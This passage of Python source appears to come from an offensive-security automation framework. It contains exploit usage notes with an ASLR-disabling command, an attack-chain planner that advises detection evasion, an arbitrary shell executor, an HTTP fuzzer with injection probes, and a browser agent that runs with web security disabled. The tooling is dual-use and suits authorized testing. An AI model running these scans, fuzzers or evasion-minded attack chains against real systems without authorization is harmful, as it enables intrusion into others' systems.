            f"# Vulnerability Type: {vuln_type}",
            "",
            "## Usage Instructions:",
            "1. Ensure target is vulnerable to this CVE",
            "2. Adjust target parameters as needed",
            "3. Test in controlled environment first",
            "4. Execute with appropriate permissions",
            "",
            "## Testing:",
            f"python3 exploit.py {params.get('target_ip', '')} {params.get('target_port', '')}"
        ]
        
        if vuln_type == "buffer_overflow":
            instructions.extend([
                "",
                "## Buffer Overflow Notes:",
                f"- Offset: {params.get('offset', 'Unknown')}",
                f"- Return address: {params.get('ret_address', 'Unknown')}",
                "- Verify addresses match target binary",
                "- Disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space"
            ])
        
        return "\n".join(instructions)

class VulnerabilityCorrelator:
    """Correlate vulnerabilities for multi-stage attack chain discovery"""
    
    def __init__(self):
        self.attack_patterns = {
            "privilege_escalation": ["local", "kernel", "suid", "sudo"],
            "remote_execution": ["remote", "network", "rce", "code execution"],
            "persistence": ["service", "registry", "scheduled", "startup"],
            "lateral_movement": ["smb", "wmi", "ssh", "rdp"],
            "data_exfiltration": ["file", "database", "memory", "network"]
        }
        
        self.software_relationships = {
            "windows": ["iis", "office", "exchange", "sharepoint"],
            "linux": ["apache", "nginx", "mysql", "postgresql"],
            "web": ["php", "nodejs", "python", "java"],
            "database": ["mysql", "postgresql", "oracle", "mssql"]
        }
    
    def find_attack_chains(self, target_software, max_depth=3):
        """Find multi-vulnerability attack chains"""
        try:
            # This is a simplified implementation
            # Real version would use graph algorithms and ML
            
            chains = []
            
            # Example attack chain discovery logic
            base_software = target_software.lower()
            
            # Find initial access vulnerabilities
            initial_vulns = self._find_vulnerabilities_by_pattern(base_software, "remote_execution")
            
            for initial_vuln in initial_vulns[:3]:  # Limit for demo
                chain = {
                    "chain_id": f"chain_{len(chains) + 1}",
                    "target": target_software,
                    "stages": [
                        {
                            "stage": 1,
                            "objective": "Initial Access",
                            "vulnerability": initial_vuln,
                            "success_probability": 0.75
                        }
                    ],
                    "overall_probability": 0.75,
                    "complexity": "MEDIUM"
                }
                
                # Find privilege escalation
                priv_esc_vulns = self._find_vulnerabilities_by_pattern(base_software, "privilege_escalation")
                if priv_esc_vulns:
                    chain["stages"].append({
                        "stage": 2,
                        "objective": "Privilege Escalation",
                        "vulnerability": priv_esc_vulns[0],
                        "success_probability": 0.60
                    })
                    chain["overall_probability"] *= 0.60
                
                # Find persistence
                persistence_vulns = self._find_vulnerabilities_by_pattern(base_software, "persistence")
                if persistence_vulns and len(chain["stages"]) < max_depth:
                    chain["stages"].append({
                        "stage": 3,
                        "objective": "Persistence",
                        "vulnerability": persistence_vulns[0],
                        "success_probability": 0.80
                    })
                    chain["overall_probability"] *= 0.80
                
                chains.append(chain)
            
            return {
                "success": True,
                "target_software": target_software,
                "total_chains": len(chains),
                "attack_chains": chains,
                "recommendation": self._generate_chain_recommendations(chains)
            }
            
        except Exception as e:
            logger.error(f"Error finding attack chains: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _find_vulnerabilities_by_pattern(self, software, pattern_type):
        """Find vulnerabilities matching attack pattern"""
        # Simplified mock data - real implementation would query CVE database
        mock_vulnerabilities = [
            {
                "cve_id": "CVE-2024-1234",
                "description": f"Remote code execution in {software}",
                "cvss_score": 9.8,
                "exploitability": "HIGH"
            },
            {
                "cve_id": "CVE-2024-5678",
                "description": f"Privilege escalation in {software}",
                "cvss_score": 7.8,
                "exploitability": "MEDIUM"
            }
        ]
        
        return mock_vulnerabilities
    
    def _generate_chain_recommendations(self, chains):
        """Generate recommendations for attack chains"""
        if not chains:
            return "No viable attack chains found for target"
        
        recommendations = [
            f"Found {len(chains)} potential attack chains",
            f"Highest probability chain: {max(chains, key=lambda x: x['overall_probability'])['overall_probability']:.2%}",
            "Recommendations:",
            "- Test chains in order of probability",
            "- Prepare fallback methods for each stage",
            "- Consider detection evasion at each stage"
        ]
        
        return "\n".join(recommendations)

# Global intelligence managers
cve_intelligence = CVEIntelligenceManager()
exploit_generator = AIExploitGenerator()
vulnerability_correlator = VulnerabilityCorrelator()

def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
    """
    Execute a shell command with enhanced features
    
    Args:
        command: The command to execute
        use_cache: Whether to use caching for this command
        
    Returns:
        A dictionary containing the stdout, stderr, return code, and metadata
    """
    
    # Check cache first
    if use_cache:
        cached_result = cache.get(command, {})
        if cached_result:
            return cached_result
    
    # Execute command
    executor = EnhancedCommandExecutor(command)
    result = executor.execute()
    
    # Cache successful results
    if use_cache and result.get("success", False):
        cache.set(command, {}, result)
    
    return result

def execute_command_with_recovery(tool_name: str, command: str, parameters: Dict[str, Any] = None, 
                                 use_cache: bool = True, max_attempts: int = 3) -> Dict[str, Any]:
    """
    Execute a command with intelligent error handling and recovery
    
    Args:
        tool_name: Name of the tool being executed
        command: The command to execute
        parameters: Tool parameters for context
        use_cache: Whether to use caching
        max_attempts: Maximum number of recovery attempts
        
    Returns:
        A dictionary containing execution results with recovery information
    """
    if parameters is None:
        parameters = {}
    
    attempt_count = 0
    last_error = None
    recovery_history = []
    
    while attempt_count < max_attempts:
        attempt_count += 1
        
        try:
            # Execute the command
            result = execute_command(command, use_cache)
            
            # Check if execution was successful
            if result.get("success", False):
                # Add recovery information to successful result
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": len(recovery_history) > 0,
                    "recovery_history": recovery_history
                }
                return result
            
            # Command failed, determine if we should attempt recovery
            error_message = result.get("stderr", "Unknown error")
            exception = Exception(error_message)
            
            # Create context for error handler
            context = {
                "target": parameters.get("target", "unknown"),
                "parameters": parameters,
                "attempt_count": attempt_count,
                "command": command
            }
            
            # Get recovery strategy from error handler
            recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)
            recovery_history.append({
                "attempt": attempt_count,
                "error": error_message,
                "recovery_action": recovery_strategy.action.value,
                "timestamp": datetime.now().isoformat()
            })
            
            # Apply recovery strategy
            if recovery_strategy.action == RecoveryAction.RETRY_WITH_BACKOFF:
                delay = recovery_strategy.parameters.get("initial_delay", 5)
                backoff = recovery_strategy.parameters.get("max_delay", 60)
                actual_delay = min(delay * (recovery_strategy.backoff_multiplier ** (attempt_count - 1)), backoff)
                
                retry_info = f'Retrying in {actual_delay}s (attempt {attempt_count}/{max_attempts})'
                logger.info(f"{ModernVisualEngine.format_tool_status(tool_name, 'RECOVERY', retry_info)}")
                time.sleep(actual_delay)
                continue
                
            elif recovery_strategy.action == RecoveryAction.RETRY_WITH_REDUCED_SCOPE:
                # Adjust parameters to reduce scope
                adjusted_params = error_handler.auto_adjust_parameters(
                    tool_name, 
                    error_handler.classify_error(error_message, exception),
                    parameters
                )
                
                # Rebuild command with adjusted parameters
                command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                logger.info(f"🔧 Retrying {tool_name} with reduced scope")
                continue
                
            elif recovery_strategy.action == RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL:
                # Get alternative tool
                alternative_tool = error_handler.get_alternative_tool(tool_name, recovery_strategy.parameters)
                
                if alternative_tool:
                    switch_info = f'Switching to alternative: {alternative_tool}'
                    logger.info(f"{ModernVisualEngine.format_tool_status(tool_name, 'RECOVERY', switch_info)}")
                    # This would require the calling function to handle tool switching
                    result["alternative_tool_suggested"] = alternative_tool
                    result["recovery_info"] = {
                        "attempts_made": attempt_count,
                        "recovery_applied": True,
                        "recovery_history": recovery_history,
                        "final_action": "tool_switch_suggested"
                    }
                    return result
                else:
                    logger.warning(f"⚠️  No alternative tool found for {tool_name}")
                    
            elif recovery_strategy.action == RecoveryAction.ADJUST_PARAMETERS:
                # Adjust parameters based on error type
                error_type = error_handler.classify_error(error_message, exception)
                adjusted_params = error_handler.auto_adjust_parameters(tool_name, error_type, parameters)
                
                # Rebuild command with adjusted parameters
                command = _rebuild_command_with_params(tool_name, command, adjusted_params)
                logger.info(f"🔧 Retrying {tool_name} with adjusted parameters")
                continue
                
            elif recovery_strategy.action == RecoveryAction.ESCALATE_TO_HUMAN:
                # Create error context for escalation
                error_context = ErrorContext(
                    tool_name=tool_name,
                    target=parameters.get("target", "unknown"),
                    parameters=parameters,
                    error_type=error_handler.classify_error(error_message, exception),
                    error_message=error_message,
                    attempt_count=attempt_count,
                    timestamp=datetime.now(),
                    stack_trace="",
                    system_resources=error_handler._get_system_resources()
                )
                
                escalation_data = error_handler.escalate_to_human(
                    error_context, 
                    recovery_strategy.parameters.get("urgency", "medium")
                )
                
                result["human_escalation"] = escalation_data
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "human_escalation"
                }
                return result
                
            elif recovery_strategy.action == RecoveryAction.GRACEFUL_DEGRADATION:
                # Apply graceful degradation
                operation = _determine_operation_type(tool_name)
                degraded_result = degradation_manager.handle_partial_failure(
                    operation, 
                    result, 
                    [tool_name]
                )
                
                degraded_result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "graceful_degradation"
                }
                return degraded_result
                
            elif recovery_strategy.action == RecoveryAction.ABORT_OPERATION:
                logger.error(f"🛑 Aborting {tool_name} operation after {attempt_count} attempts")
                result["recovery_info"] = {
                    "attempts_made": attempt_count,
                    "recovery_applied": True,
                    "recovery_history": recovery_history,
                    "final_action": "operation_aborted"
                }
                return result
            
            last_error = exception
            
        except Exception as e:
            last_error = e
            logger.error(f"💥 Unexpected error in recovery attempt {attempt_count}: {str(e)}")
            
            # If this is the last attempt, escalate to human
            if attempt_count >= max_attempts:
                error_context = ErrorContext(
                    tool_name=tool_name,
                    target=parameters.get("target", "unknown"),
                    parameters=parameters,
                    error_type=ErrorType.UNKNOWN,
                    error_message=str(e),
                    attempt_count=attempt_count,
                    timestamp=datetime.now(),
                    stack_trace=traceback.format_exc(),
                    system_resources=error_handler._get_system_resources()
                )
                
                escalation_data = error_handler.escalate_to_human(error_context, "high")
                
                return {
                    "success": False,
                    "error": str(e),
                    "human_escalation": escalation_data,
                    "recovery_info": {
                        "attempts_made": attempt_count,
                        "recovery_applied": True,
                        "recovery_history": recovery_history,
                        "final_action": "human_escalation_after_failure"
                    }
                }
    
    # All attempts exhausted
    logger.error(f"🚫 All recovery attempts exhausted for {tool_name}")
    return {
        "success": False,
        "error": f"All recovery attempts exhausted: {str(last_error)}",
        "recovery_info": {
            "attempts_made": attempt_count,
            "recovery_applied": True,
            "recovery_history": recovery_history,
            "final_action": "all_attempts_exhausted"
        }
    }

def _rebuild_command_with_params(tool_name: str, original_command: str, new_params: Dict[str, Any]) -> str:
    """Rebuild command with new parameters"""
    # This is a simplified implementation - in practice, you'd need tool-specific logic
    # For now, we'll just append new parameters
    additional_args = []
    
    for key, value in new_params.items():
        if key == "timeout" and tool_name in ["nmap", "gobuster", "nuclei"]:
            additional_args.append(f"--timeout {value}")
        elif key == "threads" and tool_name in ["gobuster", "feroxbuster", "ffuf"]:
            additional_args.append(f"-t {value}")
        elif key == "delay" and tool_name in ["gobuster", "feroxbuster"]:
            additional_args.append(f"--delay {value}")
        elif key == "timing" and tool_name == "nmap":
            additional_args.append(f"{value}")
        elif key == "concurrency" and tool_name == "nuclei":
            additional_args.append(f"-c {value}")
        elif key == "rate-limit" and tool_name == "nuclei":
            additional_args.append(f"-rl {value}")
    
    if additional_args:
        return f"{original_command} {' '.join(additional_args)}"
    
    return original_command

def _determine_operation_type(tool_name: str) -> str:
    """Determine operation type based on tool name"""
    operation_mapping = {
        "nmap": "network_discovery",
        "rustscan": "network_discovery", 
        "masscan": "network_discovery",
        "gobuster": "web_discovery",
        "feroxbuster": "web_discovery",
        "dirsearch": "web_discovery",
        "ffuf": "web_discovery",
        "nuclei": "vulnerability_scanning",
        "jaeles": "vulnerability_scanning",
        "nikto": "vulnerability_scanning",
        "subfinder": "subdomain_enumeration",
        "amass": "subdomain_enumeration",
        "assetfinder": "subdomain_enumeration",
        "arjun": "parameter_discovery",
        "paramspider": "parameter_discovery",
        "x8": "parameter_discovery"
    }
    
    return operation_mapping.get(tool_name, "unknown_operation")

# File Operations Manager
class FileOperationsManager:
    """Handle file operations with security and validation"""
    
    def __init__(self, base_dir: str = "/tmp/hexstrike_files"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)
        self.max_file_size = 100 * 1024 * 1024  # 100MB
    
    def create_file(self, filename: str, content: str, binary: bool = False) -> Dict[str, Any]:
        """Create a file with the specified content"""
        try:
            file_path = self.base_dir / filename
            file_path.parent.mkdir(parents=True, exist_ok=True)
            
            if len(content.encode()) > self.max_file_size:
                return {"success": False, "error": f"File size exceeds {self.max_file_size} bytes"}
            
            mode = "wb" if binary else "w"
            with open(file_path, mode) as f:
                if binary:
                    f.write(content.encode() if isinstance(content, str) else content)
                else:
                    f.write(content)
            
            logger.info(f"📄 Created file: {filename} ({len(content)} bytes)")
            return {"success": True, "path": str(file_path), "size": len(content)}
            
        except Exception as e:
            logger.error(f"❌ Error creating file {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def modify_file(self, filename: str, content: str, append: bool = False) -> Dict[str, Any]:
        """Modify an existing file"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}
            
            mode = "a" if append else "w"
            with open(file_path, mode) as f:
                f.write(content)
            
            logger.info(f"✏️  Modified file: {filename}")
            return {"success": True, "path": str(file_path)}
            
        except Exception as e:
            logger.error(f"❌ Error modifying file {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def delete_file(self, filename: str) -> Dict[str, Any]:
        """Delete a file or directory"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}
            
            if file_path.is_dir():
                shutil.rmtree(file_path)
            else:
                file_path.unlink()
            
            logger.info(f"🗑️  Deleted: {filename}")
            return {"success": True}
            
        except Exception as e:
            logger.error(f"❌ Error deleting {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def list_files(self, directory: str = ".") -> Dict[str, Any]:
        """List files in a directory"""
        try:
            dir_path = self.base_dir / directory
            if not dir_path.exists():
                return {"success": False, "error": "Directory does not exist"}
            
            files = []
            for item in dir_path.iterdir():
                files.append({
                    "name": item.name,
                    "type": "directory" if item.is_dir() else "file",
                    "size": item.stat().st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(item.stat().st_mtime).isoformat()
                })
            
            return {"success": True, "files": files}
            
        except Exception as e:
            logger.error(f"❌ Error listing files in {directory}: {e}")
            return {"success": False, "error": str(e)}

# Global file operations manager
file_manager = FileOperationsManager()

# API Routes



# File Operations API Endpoints





# ============================================================================
# PROCESS MANAGEMENT API ENDPOINTS (v5.0 ENHANCEMENT)
# ============================================================================





# ============================================================================
# INTELLIGENT DECISION ENGINE API ENDPOINTS
# ============================================================================







# ============================================================================
# BUG BOUNTY HUNTING WORKFLOW API ENDPOINTS
# ============================================================================







# ============================================================================
# SECURITY TOOLS API ENDPOINTS
# ============================================================================




# ============================================================================
# CLOUD SECURITY TOOLS
# ============================================================================



# ============================================================================
# ENHANCED CLOUD AND CONTAINER SECURITY TOOLS (v6.0)
# ============================================================================

























# ============================================================================
# ENHANCED NETWORK PENETRATION TESTING TOOLS (v6.0)
# ============================================================================












# ============================================================================
# BINARY ANALYSIS & REVERSE ENGINEERING TOOLS
# ============================================================================









# ============================================================================
# ENHANCED BINARY ANALYSIS AND EXPLOITATION FRAMEWORK (v6.0)
# ============================================================================







# ============================================================================
# ADDITIONAL WEB SECURITY TOOLS
# ============================================================================





# ============================================================================
# ENHANCED WEB APPLICATION SECURITY TOOLS (v6.0)
# ============================================================================














# ============================================================================
# ADVANCED WEB SECURITY TOOLS CONTINUED
# ============================================================================

# ============================================================================
# ENHANCED HTTP TESTING FRAMEWORK (BURP SUITE ALTERNATIVE)
# ============================================================================

class HTTPTestingFramework:
    """Advanced HTTP testing framework as Burp Suite alternative"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)'
        })
        self.proxy_history = []
        self.vulnerabilities = []
        self.match_replace_rules = []  # [{'where':'query|headers|body|url','pattern':'regex','replacement':'str'}]
        self.scope = None  # {'host': 'example.com', 'include_subdomains': True}
        self._req_id = 0
        
    def setup_proxy(self, proxy_port: int = 8080):
        """Setup HTTP proxy for request interception"""
        self.session.proxies = {
            'http': f'http://127.0.0.1:{proxy_port}',
            'https': f'http://127.0.0.1:{proxy_port}'
        }
        
    def intercept_request(self, url: str, method: str = 'GET', data: dict = None, 
                         headers: dict = None, cookies: dict = None) -> dict:
        """Intercept and analyze HTTP requests"""
        try:
            if headers:
                self.session.headers.update(headers)
            if cookies:
                self.session.cookies.update(cookies)

            # Apply match/replace rules prior to sending
            url, data, send_headers = self._apply_match_replace(url, data, dict(self.session.headers))
            if headers:
                send_headers.update(headers)
                
            if method.upper() == 'GET':
                response = self.session.get(url, params=data, headers=send_headers, timeout=30)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=send_headers, timeout=30)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=send_headers, timeout=30)
            else:
                response = self.session.request(method, url, data=data, headers=send_headers, timeout=30)
            
            # Store request/response in history
            self._req_id += 1
            request_data = {
                'id': self._req_id,
                'url': url,
                'method': method,
                'headers': dict(response.request.headers),
                'data': data,
                'timestamp': datetime.now().isoformat()
            }
            
            response_data = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.text[:10000],  # Limit content size
                'size': len(response.content),
                'time': response.elapsed.total_seconds()
            }
            
            self.proxy_history.append({
                'request': request_data,
                'response': response_data
            })
            
            # Analyze for vulnerabilities
            self._analyze_response_for_vulns(url, response)
            
            return {
                'success': True,
                'request': request_data,
                'response': response_data,
                'vulnerabilities': self._get_recent_vulns()
            }
            
        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
            return {'success': False, 'error': str(e)}

    # ----------------- Match & Replace and Scope -----------------
    def set_match_replace_rules(self, rules: list):
        """Set match/replace rules. Each rule: {'where','pattern','replacement'}"""
        self.match_replace_rules = rules or []

    def set_scope(self, host: str, include_subdomains: bool = True):
        self.scope = {'host': host, 'include_subdomains': include_subdomains}

    def _in_scope(self, url: str) -> bool:
        if not self.scope:
            return True
        try:
            from urllib.parse import urlparse
            h = urlparse(url).hostname or ''
            target = self.scope.get('host','')
            if not h or not target:
                return True
            if h == target:
                return True
            if self.scope.get('include_subdomains') and h.endswith('.'+target):
                return True
        except Exception:
            return True
        return False

    def _apply_match_replace(self, url: str, data, headers: dict):
        import re
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        original_url = url
        out_headers = dict(headers)
        out_data = data
        for rule in self.match_replace_rules:
            where = (rule.get('where') or 'url').lower()
            pattern = rule.get('pattern') or ''
            repl = rule.get('replacement') or ''
            try:
                if where == 'url':
                    url = re.sub(pattern, repl, url)
                elif where == 'query':
                    pr = urlparse(url)
                    qs = parse_qsl(pr.query, keep_blank_values=True)
                    new_qs = []
                    for k, v in qs:
                        nk = re.sub(pattern, repl, k)
                        nv = re.sub(pattern, repl, v)
                        new_qs.append((nk, nv))
                    url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(new_qs), pr.fragment))
                elif where == 'headers':
                    out_headers = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_headers.items()}
                elif where == 'body':
                    if isinstance(out_data, dict):
                        out_data = {re.sub(pattern, repl, k): re.sub(pattern, repl, str(v)) for k, v in out_data.items()}
                    elif isinstance(out_data, str):
                        out_data = re.sub(pattern, repl, out_data)
            except Exception:
                continue
        # Ensure scope restriction
        if not self._in_scope(url):
            logger.warning(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SKIPPED', f'Out of scope: {url}')}" )
            return original_url, data, headers
        return url, out_data, out_headers

    # ----------------- Repeater (custom send) -----------------
    def send_custom_request(self, request_spec: dict) -> dict:
        """Send a custom request with explicit fields, applying rules."""
        url = request_spec.get('url','')
        method = request_spec.get('method','GET')
        headers = request_spec.get('headers') or {}
        cookies = request_spec.get('cookies') or {}
        data = request_spec.get('data')
        return self.intercept_request(url, method, data, headers, cookies)

    # ----------------- Intruder (Sniper mode) -----------------
    def intruder_sniper(self, url: str, method: str = 'GET', location: str = 'query',
                        params: list = None, payloads: list = None, base_data: dict = None,
                        max_requests: int = 100) -> dict:
        """Simple fuzzing: iterate payloads over each parameter individually (Sniper)."""
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        params = params or []
        payloads = payloads or ["'\"<>`, ${7*7}"]
        base_data = base_data or {}
        interesting = []
        total = 0
        baseline = self.intercept_request(url, method, base_data)
        base_status = baseline.get('response',{}).get('status_code') if baseline.get('success') else None
        base_len = baseline.get('response',{}).get('size') if baseline.get('success') else None
        for p in params:
            for pay in payloads:
                if total >= max_requests:
                    break
                m_url = url
                m_data = dict(base_data)
                m_headers = {}
                if location == 'query':
                    pr = urlparse(url)
                    q = dict(parse_qsl(pr.query, keep_blank_values=True))
                    q[p] = pay
                    m_url = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(q), pr.fragment))
                elif location == 'body':
                    m_data[p] = pay
                elif location == 'headers':
                    m_headers[p] = pay
                elif location == 'cookie':
                    self.session.cookies.set(p, pay)
                resp = self.intercept_request(m_url, method, m_data, m_headers)
                total += 1
                if not resp.get('success'):
                    continue
                r = resp['response']
                changed = (base_status is not None and r.get('status_code') != base_status) or (base_len is not None and abs(r.get('size',0) - base_len) > 150)
                reflected = pay in (r.get('content') or '')
                if changed or reflected:
                    interesting.append({
                        'param': p,
                        'payload': pay,
                        'status_code': r.get('status_code'),
                        'size': r.get('size'),
                        'reflected': reflected
                    })
        return {
            'success': True,
            'tested': total,
            'interesting': interesting[:50]
        }
    
    def _analyze_response_for_vulns(self, url: str, response):
        """Analyze HTTP response for common vulnerabilities"""
        vulns = []
        
        # Check for missing security headers
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection missing',
            'X-Content-Type-Options': 'MIME type sniffing protection missing',
            'X-XSS-Protection': 'XSS protection missing',
            'Strict-Transport-Security': 'HTTPS enforcement missing',
            'Content-Security-Policy': 'Content Security Policy missing'
        }
        
        for header, description in security_headers.items():
            if header not in response.headers:
                vulns.append({
                    'type': 'missing_security_header',
                    'severity': 'medium',
                    'description': description,
                    'url': url,
                    'header': header
                })
        
        # Check for sensitive information disclosure
        sensitive_patterns = [
            (r'password\s*[:=]\s*["\']?([^"\'\s]+)', 'Password disclosure'),
            (r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)', 'API key disclosure'),
            (r'secret\s*[:=]\s*["\']?([^"\'\s]+)', 'Secret disclosure'),
            (r'token\s*[:=]\s*["\']?([^"\'\s]+)', 'Token disclosure')
        ]
        
        for pattern, description in sensitive_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                vulns.append({
                    'type': 'information_disclosure',
                    'severity': 'high',
                    'description': description,
                    'url': url,
                    'matches': matches[:5]  # Limit matches
                })
        
        # Check for SQL injection indicators
        sql_errors = [
            'SQL syntax error',
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'PostgreSQL query failed'
        ]
        
        for error in sql_errors:
            if error.lower() in response.text.lower():
                vulns.append({
                    'type': 'sql_injection_indicator',
                    'severity': 'high',
                    'description': f'Potential SQL injection: {error}',
                    'url': url
                })
        
        self.vulnerabilities.extend(vulns)
    
    def _get_recent_vulns(self, limit: int = 10):
        """Get recent vulnerabilities found"""
        return self.vulnerabilities[-limit:] if self.vulnerabilities else []
    
    def spider_website(self, base_url: str, max_depth: int = 3, max_pages: int = 100) -> dict:
        """Spider website to discover endpoints and forms"""
        try:
            discovered_urls = set()
            forms = []
            to_visit = [(base_url, 0)]
            visited = set()
            
            while to_visit and len(discovered_urls) < max_pages:
                current_url, depth = to_visit.pop(0)
                
                if current_url in visited or depth > max_depth:
                    continue
                    
                visited.add(current_url)
                
                try:
                    response = self.session.get(current_url, timeout=10)
                    if response.status_code == 200:
                        discovered_urls.add(current_url)
                        
                        # Parse HTML for links and forms
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Find all links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(current_url, href)
                            
                            if urlparse(full_url).netloc == urlparse(base_url).netloc:
                                if full_url not in visited and depth < max_depth:
                                    to_visit.append((full_url, depth + 1))
                        
                        # Find all forms
                        for form in soup.find_all('form'):
                            form_data = {
                                'url': current_url,
                                'action': urljoin(current_url, form.get('action', '')),
                                'method': form.get('method', 'GET').upper(),
                                'inputs': []
                            }
                            
                            for input_tag in form.find_all(['input', 'textarea', 'select']):
                                form_data['inputs'].append({
                                    'name': input_tag.get('name', ''),
                                    'type': input_tag.get('type', 'text'),
                                    'value': input_tag.get('value', '')
                                })
                            
                            forms.append(form_data)
                            
                except Exception as e:
                    logger.warning(f"Error spidering {current_url}: {str(e)}")
                    continue
            
            return {
                'success': True,
                'discovered_urls': list(discovered_urls),
                'forms': forms,
                'total_pages': len(discovered_urls),
                'vulnerabilities': self._get_recent_vulns()
            }
            
        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'Spider', str(e))}")
            return {'success': False, 'error': str(e)}

class BrowserAgent:
    """AI-powered browser agent for web application testing and inspection"""
    
    def __init__(self):
        self.driver = None
        self.screenshots = []
        self.page_sources = []
        self.network_logs = []
        
    def setup_browser(self, headless: bool = True, proxy_port: int = None):
        """Setup Chrome browser with security testing options"""
        try:
            chrome_options = Options()
            
            if headless:
                chrome_options.add_argument('--headless')
            
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--user-agent=HexStrike-BrowserAgent/1.0 (Security Testing)')
            
            # Enable logging
            chrome_options.add_argument('--enable-logging')
            chrome_options.add_argument('--log-level=0')
            
            # Security testing options
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            
            if proxy_port:
                chrome_options.add_argument(f'--proxy-server=http://127.0.0.1:{proxy_port}')
            
            # Enable network logging
            chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)
            
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'RUNNING', 'Chrome Browser Initialized')}")
            return True
            
        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return False
    
    def navigate_and_inspect(self, url: str, wait_time: int = 5) -> dict:
        """Navigate to URL and perform comprehensive inspection"""
        try:
            if not self.driver:
                if not self.setup_browser():
                    return {'success': False, 'error': 'Failed to setup browser'}
            
            nav_command = f'Navigate to {url}'
            logger.info(f"{ModernVisualEngine.format_command_execution(nav_command, 'STARTING')}")
            
            # Navigate to URL
            self.driver.get(url)
            time.sleep(wait_time)
            
            # Take screenshot
            screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
            self.driver.save_screenshot(screenshot_path)
            self.screenshots.append(screenshot_path)
            
            # Get page source
            page_source = self.driver.page_source
            self.page_sources.append({
                'url': url,
                'source': page_source[:50000],  # Limit size
                'timestamp': datetime.now().isoformat()
            })
            
            # Extract page information
            page_info = {
                'title': self.driver.title,
                'url': self.driver.current_url,
                'cookies': [{'name': c['name'], 'value': c['value'], 'domain': c['domain']} 
                           for c in self.driver.get_cookies()],
                'local_storage': self._get_local_storage(),
                'session_storage': self._get_session_storage(),
                'forms': self._extract_forms(),
                'links': self._extract_links(),
                'inputs': self._extract_inputs(),
                'scripts': self._extract_scripts(),
                'network_requests': self._get_network_logs(),
                'console_errors': self._get_console_errors()
            }
            
            # Analyze for security issues
            security_analysis = self._analyze_page_security(page_source, page_info)
            # Merge extended passive analysis
            extended_passive = self._extended_passive_analysis(page_info, page_source)
            security_analysis['issues'].extend(extended_passive['issues'])
            security_analysis['total_issues'] = len(security_analysis['issues'])
            security_analysis['security_score'] = max(0, 100 - (security_analysis['total_issues'] * 5))
            security_analysis['passive_modules'] = extended_passive.get('modules', [])
            
            logger.info(f"{ModernVisualEngine.format_tool_status('BrowserAgent', 'SUCCESS', url)}")
            
            return {
                'success': True,
                'page_info': page_info,
                'security_analysis': security_analysis,
                'screenshot': screenshot_path,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
            return {'success': False, 'error': str(e)}
    
    # ---------------------- Browser Deep Introspection Helpers ----------------------
    def _get_console_errors(self) -> list:
        """Collect console errors & warnings (if supported)"""
        try:
            logs = self.driver.get_log('browser')
            out = []
            for entry in logs[-100:]:
                lvl = entry.get('level', '')
                if lvl in ('SEVERE', 'WARNING'):
                    out.append({'level': lvl, 'message': entry.get('message', '')[:500]})
            return out
        except Exception:
            return []

    def _analyze_cookies(self, cookies: list) -> list:
        issues = []
        for ck in cookies:
            name = ck.get('name','')
            # Selenium cookie dict may lack flags; attempt JS check if not present
            # (we keep lightweight – deeper flag detection requires CDP)
            if name.lower() in ('sessionid','phpseSSID','jsessionid') and len(ck.get('value','')) < 16:
                issues.append({'type':'weak_session_cookie','severity':'medium','description':f'Session cookie {name} appears short'})
        return issues

